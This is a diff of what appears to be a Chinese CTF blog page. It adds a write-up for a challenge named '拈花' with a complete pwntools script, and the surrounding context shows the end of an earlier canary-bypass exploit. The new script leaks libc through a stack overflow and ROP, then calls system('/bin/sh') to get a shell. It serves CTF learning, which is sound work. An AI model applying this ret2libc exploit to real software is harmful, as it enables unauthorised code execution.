@@ -391,14 +391,14 @@ from LibcSearch">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.5k
+                        1.8k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        8 分
+                        9 分
                     </div>
                     
                 
@@ -615,6 +615,38 @@ gdb.attach(r,&#39;b *0x0000000004011AC\nc&#39;)
 payload12 = &#39;a&#39; * 8 + p64(canary) + &#39;a&#39; * 8 + p2
 r.sendline(b64encode(payload12))
 r.sendline(&#39;no&#39;)
+r.interactive()
+
+</code></pre><h3 id="拈花"><a href="#拈花" class="headerlink" title="拈花"></a>拈花</h3><p>相比于前面的题目，这个就是新手的练习吧？直接一个栈溢出泄露libc然后执行system，最后getshell ,一套操作行云流水</p>
+<pre><code># coding=utf-8
+from pwn import *
+from LibcSearcher import LibcSearcher
+context.log_level = &#39;debug&#39;
+r = process(&#39;./pwn11&#39;)
+elf = ELF(&#39;./pwn11&#39;)
+puts_plt = elf.symbols[&#39;puts&#39;]
+pop_rdi_ret = 0x00000000004012ab
+puts_got = elf.got[&#39;puts&#39;]
+main_addr = 0x000000000401162
+offset = 40
+r.recvuntil(&#39;please input your name\n&#39;)
+r.sendline(&#39;aaaa&#39;)
+r.recvuntil(&quot;Let&#39;s start a game,can you guess the key?\n&quot;)
+#gdb.attach(r)
+payload1 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+r.sendline(payload1)
+r.recvuntil(&#39;fail!\n&#39;)
+puts_addr = u64(r.recvuntil(&#39;\n&#39;,drop=True).ljust(8,&#39;\x00&#39;))
+print hex(puts_addr)
+libc = LibcSearcher(&#39;puts&#39;,puts_addr)
+libcbase = puts_addr - libc.dump(&#39;puts&#39;)
+system_addr = libcbase + libc.dump(&#39;system&#39;)
+binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)
+r.recvuntil(&#39;please input your name\n&#39;)
+r.sendline(&#39;aaaa&#39;)
+payload2 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
+r.recvuntil(&quot;Let&#39;s start a game,can you guess the key?\n&quot;)
+r.sendline(payload2)
 r.interactive()
 
 </code></pre>
@@ -946,7 +978,7 @@ fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128by
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">10.2k</span>
+                <span class="white-color">10.4k</span>
             
 
             
